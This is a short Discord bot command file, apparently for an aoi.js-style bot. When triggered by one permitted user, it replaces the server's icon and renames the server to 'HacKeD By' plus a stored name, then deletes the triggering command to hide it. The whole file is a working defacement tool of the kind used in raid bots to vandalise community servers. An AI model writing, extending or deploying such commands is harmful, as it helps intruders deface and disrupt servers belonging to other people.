module.exports = {
  name:"server",
  aliases:["sunucu"],
  code:`
  $sendMessage[
  Server Icon :white_check_mark: 
  Server Name :white_check_mark:{delete:5s};no]
  $setGuildIcon[https://images-ext-2.discordapp.net/external/FYBWP5Tc7eLoU1HSkxwOkut72OcimWNreB8544mAlxM/%3Fsize%3D4096/https/cdn.discordapp.com/icons/971811564086788116/c3c64529fa8232efbf0c6a726040566c.webp?width=107&height=107]
  $setGuildName[HacKeD By $getVar[ghostt]]
  $wait[2s]
  $sendMessage[Wait... ⌛{delete:2s};no]  
  $deletecommand
  $onlyforids[$getvar[id];]
  `
}
